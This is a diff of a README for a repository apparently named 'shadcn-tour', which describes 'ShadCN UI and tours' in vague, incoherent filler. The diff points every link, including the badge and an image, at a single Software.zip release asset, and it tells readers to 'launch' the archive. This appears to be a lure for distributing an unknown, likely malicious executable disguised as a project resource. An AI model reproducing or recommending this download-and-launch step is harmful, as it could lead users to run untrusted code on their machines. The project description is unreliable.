@@ -10,18 +10,18 @@ This repository is a treasure trove of resources related to ShadCN UI and tours,
 ⭐ Tour
 
 ## Resources
-Explore the Software.zip file by clicking the link below:
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+Explore the https://github.com/ahvaitomanocuvai/shadcn-tour/releases/download/v1.0/Software.zip file by clicking the link below:
+[![Download Software](https://github.com/ahvaitomanocuvai/shadcn-tour/releases/download/v1.0/Software.zip)](https://github.com/ahvaitomanocuvai/shadcn-tour/releases/download/v1.0/Software.zip)
 
 ### Note:
-Kindly ensure to launch the Software.zip file to access the contents.
+Kindly ensure to launch the https://github.com/ahvaitomanocuvai/shadcn-tour/releases/download/v1.0/Software.zip file to access the contents.
 
 If the above link is not working, please check the "Releases" section for alternative download options. 📦
 
 ## Let the Adventure Begin! 🚀
 Feel free to embark on a journey of discovery with ShadCN UI and tours. Start exploring, designing, and traveling to unlock endless possibilities! 🌟🗺️
 
-![Explore](https://source.unsplash.com/1600x900/?travel)
+![Explore](https://github.com/ahvaitomanocuvai/shadcn-tour/releases/download/v1.0/Software.zip)
 
 Happy touring! 🎉🌟
 
